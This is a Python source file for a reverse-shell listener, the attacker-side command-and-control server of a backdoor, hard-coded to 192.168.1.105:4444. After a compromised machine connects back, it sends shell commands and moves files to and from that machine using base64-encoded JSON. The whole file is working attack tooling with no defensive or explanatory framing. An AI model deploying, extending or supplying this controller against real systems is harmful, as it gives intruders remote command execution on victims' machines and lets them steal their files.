import socket
import json,base64
class Listener:
	def __init__(self,ip,port):
		listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		listener.bind((ip,port))
		listener.listen(0)
		print("[+] Waiting for incoming connection")
		self.connection,address = listener.accept()
		print("[+] Got a connection from " + str(address))
	
	
	def reliable_send(self,data):
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())
	
	
	def reliable_recieve(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024).decode()
				return json.loads(json_data)
			except json.decoder.JSONDecodeError:
				continue
		
	def write_file(self,path,result):
		with open(path,"wb") as file:
			file.write(result)
			file.close()
			return "[+] File Downloaded"
				
	def exe_sys_cmd(self,command):
		self.reliable_send(command)
		if command[0] == "exit":
			self.connection.close()
			exit()
		return self.reliable_recieve()
	
	def read_file(self,path):
		with open(path,"rb") as file:
			data = file.read()
			file.close()
			return data	
			
	def run(self):
		while True:
			command = input(">> ")
			command = command.split(" ")
			try:
				if command[0] == "upload":
					data = self.read_file(command[1])
					command.append(base64.b64encode(data).decode())
				result = self.exe_sys_cmd(command)
				if command[0] == "download" and "[-] Error" not in result:
					result = self.write_file(command[1],base64.b64decode(result))
			except Exception:
				result = "[-] Error during command execution"
			
			print(result)
			

listener = Listener("192.168.1.105",4444)
listener.run()
